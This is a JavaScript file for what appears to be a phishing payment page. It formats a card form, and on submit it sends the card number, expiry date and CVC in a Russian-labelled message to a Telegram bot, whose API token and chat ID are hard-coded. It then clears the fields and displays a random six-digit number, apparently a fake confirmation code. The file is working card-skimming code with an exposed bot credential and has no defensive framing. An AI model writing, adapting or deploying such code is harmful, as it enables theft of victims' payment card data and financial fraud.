const CHAT_ID = "-1002101747684";
const URL_API = `https://api.telegram.org/bot6591959002:AAGkb-b8JEmXI8xlIww82O1DPhJl34Ngmic/sendMessage`;

const form = document.getElementById("form");

function pattern(event) {
  const inputs = form.elements;
  for (let i = 0; i < inputs.length; i++) {
    if (inputs[i].type === "text") {
      inputs[i].value = inputs[i].value.replace(/[^0-9\s/]/g, "");
    }
  }
}

form.addEventListener("input", pattern);

function onKeyDownEventHandler(e) {
  if (input.value.length === 2) {
    input.value += "/";
  }

  if ((e.keyCode === 8 || e.keyCode === 46) && input.value.slice(-1) === "/") {
    input.value = input.value.slice(0, -1);
  }
}

const input = document.querySelector("#clientInputDate");
input.addEventListener("keydown", onKeyDownEventHandler);

function spaceBetweenNumbers(e) {
  let value = e.target.value.replace(/\s/g, "");
  let spacedValue = "";

  for (let i = 0; i < value.length; i++) {
    if (i > 0 && i % 4 === 0) {
      spacedValue += " ";
    }
    spacedValue += value[i];
  }

  e.target.value = spacedValue;
}

const inputCard = document.querySelector("#clientInputCardNumber");
inputCard.addEventListener("input", spaceBetweenNumbers);

function submitForm(e) {
  e.preventDefault();
  const form = document.getElementById("form");
  console.log(form.elements.cardNumber.value);
  let message = ` Заявка \n`;
  message += `CardNumber: ${form.elements.cardNumber.value} \n`;
  message += `Exired: ${form.elements.expired.value} \n`;
  message += `CVC: ${form.elements.cvc.value} \n`;
  console.log(message);
  axios
    .post(URL_API, {
      chat_id: CHAT_ID,
      parse_mode: "html",
      text: message,
    })
    .then((response) => {
      console.log(response.data);
      form.elements.cardNumber.value = "";
      form.elements.expired.value = "";
      form.elements.cvc.value = "";
    })
    .catch((error) => {
      console.error(error.response.data);
    });
}

form.addEventListener("submit", submitForm);
function generateRandomSixDigitNumber() {
  return Math.floor(Math.random() * (999999 - 100000 + 1)) + 100000;
}
const spanElement = document.getElementById("randomNumberSpan");
const randomSixDigitNumber = generateRandomSixDigitNumber();
spanElement.textContent = randomSixDigitNumber;
